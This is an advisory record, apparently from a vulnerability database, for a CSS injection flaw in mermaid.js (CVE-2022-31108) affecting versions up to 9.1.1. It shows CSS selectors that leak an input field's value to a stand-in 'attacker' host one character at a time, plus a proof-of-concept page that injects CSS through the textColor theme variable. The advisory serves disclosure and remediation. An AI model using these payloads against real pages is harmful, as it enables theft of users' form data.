@@ -1,0 +1,216 @@
+advisory_id: GHSA-x3vm-38hw-55wf
+datasource_id: github_osv/GHSA-x3vm-38hw-55wf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/07/GHSA-x3vm-38hw-55wf/GHSA-x3vm-38hw-55wf.json
+aliases:
+  - CVE-2022-31108
+summary: |
+  Possible inject arbitrary `CSS` into the generated graph affecting the container HTML
+  An attacker is able to inject arbitrary `CSS` into the generated graph allowing them to change the styling of elements outside of the generated graph, and potentially exfiltrate sensitive information by using specially crafted `CSS` selectors.
+
+  The following example shows how an attacker can exfiltrate the contents of an input field by bruteforcing the `value` attribute one character at a time. Whenever there is an actual match, an `http` request will be made by the browser in order to "load" a background image that will let an attacker know what's the value of the character.
+
+  ```css
+  input[name=secret][value^=g] { background-image: url(http://attacker/?char=g); }
+  ...
+  input[name=secret][value^=go] { background-image: url(http://attacker/?char=o); }
+  ...
+  input[name=secret][value^=goo] { background-image: url(http://attacker/?char=o); }
+  ...
+  input[name=secret][value^=goos] { background-image: url(http://attacker/?char=s); }
+  ...
+  input[name=secret][value^=goose] { background-image: url(http://attacker/?char=e); }
+  ```
+
+  ### Patches
+  _Has the problem been patched? What versions should users upgrade to?_
+
+  ### Workarounds
+  _Is there a way for users to fix or remediate the vulnerability without upgrading?_
+
+  ### References
+  _Are there any links users can visit to find out more?_
+
+  ### For more information
+  If you have any questions or comments about this advisory:
+  * Open an issue in [example link to repo](http://example.com)
+  * Email us at [example email address](mailto:example@example.com)
+  ## Product
+
+  mermaid.js
+
+  ## Tested Version
+
+  [v9.1.1](https://github.com/mermaid-js/mermaid/releases/tag/9.1.1)
+
+  ## Details
+
+  ### Issue 1: Multiple CSS Injection (`GHSL-2022-036`)
+
+  By supplying a carefully crafted `textColor` theme variable, an attacker can inject arbitrary `CSS` rules into the document. In the following snippet we can see that `getStyles` does not sanitize any of the theme variables leaving the door open for `CSS` injection.
+
+  _Snippet from [src/styles.js](https://github.com/mermaid-js/mermaid/blob/9eae97ddab1b6eca58d2fd4af62357d2f4d8d1f7/src/styles.js#L35):_
+
+  ```js
+  const getStyles = (type, userStyles, options) => {
+    return ` {
+      font-family: ${options.fontFamily};
+      font-size: ${options.fontSize};
+      fill: ${options.textColor}
+    }
+  ```
+
+  For example, if we set `textColor` to `"green;} #target { background-color: crimson }"` the resulting `CSS` will contain a new selector `#target` that will apply a `crimson` background color to an arbitrary element.
+
+  ```html
+  <html>
+
+  <body>
+      <div id="target">
+          <h1>This element does not belong to the SVG but we can style it</h1>
+      </div>
+      <svg id="diagram">
+      </svg>
+
+      <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+      <script>
+          mermaid.initialize({ startOnLoad: false });
+
+          const graph =
+              `
+              %%{ init: { "themeVariables" : { "textColor": "green;} #target { background-color: crimson }" } } }%%
+              graph TD
+                  A[Goose]
+              `
+
+          const diagram = document.getElementById("diagram")
+          const svg = mermaid.render('diagram-svg', graph)
+          diagram.innerHTML = svg
+      </script>
+  </body>
+
+  </html>
+  ```
+
+  In the proof of concept above we used the `textColor` variable to inject `CSS`, but there are multiple functions that can potentially be abused to change the style of the document. Some of them are in the following list but we encourage mantainers to look for additional injection points:
+
+  - https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/mermaidAPI.js#L393
+  - https://github.com/mermaid-js/mermaid/blob/5d30d465354f804e361d7a041ec46da6bb5d583b/src/styles.js#L35
+
+  #### Impact
+
+  This issue may lead to `Information Disclosure` via CSS selectors and functions able to generate HTTP requests. This also allows an attacker to change the document in ways which may lead a user to perform unintended actions, such as clicking on a link, etc.
+
+  #### Remediation
+
+  Ensure that user input is adequately escaped before embedding it in CSS blocks.
+impacted_packages:
+  - purl: pkg:npm/mermaid
+    affected_versions: vers:npm/>=8.0.0|<9.1.2
+    fixed_versions: vers:npm/9.1.2
+    affected_packages:
+      - pkg:npm/mermaid@8.0.0
+      - pkg:npm/mermaid@8.1.0
+      - pkg:npm/mermaid@8.2.1
+      - pkg:npm/mermaid@8.2.2
+      - pkg:npm/mermaid@8.2.3
+      - pkg:npm/mermaid@8.2.4
+      - pkg:npm/mermaid@8.2.5
+      - pkg:npm/mermaid@8.2.6
+      - pkg:npm/mermaid@8.3.0
+      - pkg:npm/mermaid@8.3.1
+      - pkg:npm/mermaid@8.4.0
+      - pkg:npm/mermaid@8.4.1
+      - pkg:npm/mermaid@8.4.2
+      - pkg:npm/mermaid@8.4.3
+      - pkg:npm/mermaid@8.4.4
+      - pkg:npm/mermaid@8.4.5
+      - pkg:npm/mermaid@8.4.6
+      - pkg:npm/mermaid@8.4.7
+      - pkg:npm/mermaid@8.4.8
+      - pkg:npm/mermaid@8.5.0
+      - pkg:npm/mermaid@8.5.1
+      - pkg:npm/mermaid@8.5.2
+      - pkg:npm/mermaid@8.6.0
+      - pkg:npm/mermaid@8.6.1
+      - pkg:npm/mermaid@8.6.2
+      - pkg:npm/mermaid@8.6.3
+      - pkg:npm/mermaid@8.6.4
+      - pkg:npm/mermaid@8.7.0
+      - pkg:npm/mermaid@8.8.0
+      - pkg:npm/mermaid@8.8.1
+      - pkg:npm/mermaid@8.8.2
+      - pkg:npm/mermaid@8.8.3
+      - pkg:npm/mermaid@8.8.4
+      - pkg:npm/mermaid@8.9.0
+      - pkg:npm/mermaid@8.9.1
+      - pkg:npm/mermaid@8.9.2
+      - pkg:npm/mermaid@8.9.3
+      - pkg:npm/mermaid@8.10.1
+      - pkg:npm/mermaid@8.10.2
+      - pkg:npm/mermaid@8.11.0
+      - pkg:npm/mermaid@8.11.1
+      - pkg:npm/mermaid@8.11.2
+      - pkg:npm/mermaid@8.11.3
+      - pkg:npm/mermaid@8.11.4
+      - pkg:npm/mermaid@8.11.5
+      - pkg:npm/mermaid@8.12.0
+      - pkg:npm/mermaid@8.12.1
+      - pkg:npm/mermaid@8.13.0
+      - pkg:npm/mermaid@8.13.1
+      - pkg:npm/mermaid@8.13.2
+      - pkg:npm/mermaid@8.13.3
+      - pkg:npm/mermaid@8.13.4
+      - pkg:npm/mermaid@8.13.5
+      - pkg:npm/mermaid@8.13.6
+      - pkg:npm/mermaid@8.13.7
+      - pkg:npm/mermaid@8.13.8
+      - pkg:npm/mermaid@8.13.9
+      - pkg:npm/mermaid@8.13.10
+      - pkg:npm/mermaid@8.14.0-rc1
+      - pkg:npm/mermaid@8.14.0
+      - pkg:npm/mermaid@9.0.0
+      - pkg:npm/mermaid@9.0.1
+      - pkg:npm/mermaid@9.1.0
+      - pkg:npm/mermaid@9.1.1
+    fixed_packages:
+      - pkg:npm/mermaid@9.1.2
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/mermaid-js/mermaid
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mermaid-js/mermaid
+        commit: 0ae1bdb61adff1cd485caff8c62ec6b8ac57b225
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '4.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:N/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/07/GHSA-x3vm-38hw-55wf/GHSA-x3vm-38hw-55wf.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-79
+  - CWE-74
+references:
+  - url: https://github.com/mermaid-js/mermaid
+    reference_type:
+    reference_id:
+  - url: https://github.com/mermaid-js/mermaid/commit/0ae1bdb61adff1cd485caff8c62ec6b8ac57b225
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-31108
+    reference_type:
+    reference_id: CVE-2022-31108
+  - url: https://github.com/mermaid-js/mermaid/security/advisories/GHSA-x3vm-38hw-55wf
+    reference_type:
+    reference_id: GHSA-x3vm-38hw-55wf
+exploits: []
